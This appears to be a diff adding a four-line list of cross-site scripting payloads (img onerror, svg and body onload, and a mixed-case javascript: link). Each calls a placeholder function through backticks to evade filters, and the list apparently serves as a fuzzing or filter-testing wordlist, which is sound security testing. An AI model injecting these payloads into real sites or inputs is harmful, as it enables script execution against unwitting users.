@@ -1,0 +1,4 @@
+<img src=x onerror=cmd``>
+<svg/onload=cmd``>
+<a/href=javasCrIPt:cmd``>
+<body/onload=cmd``>
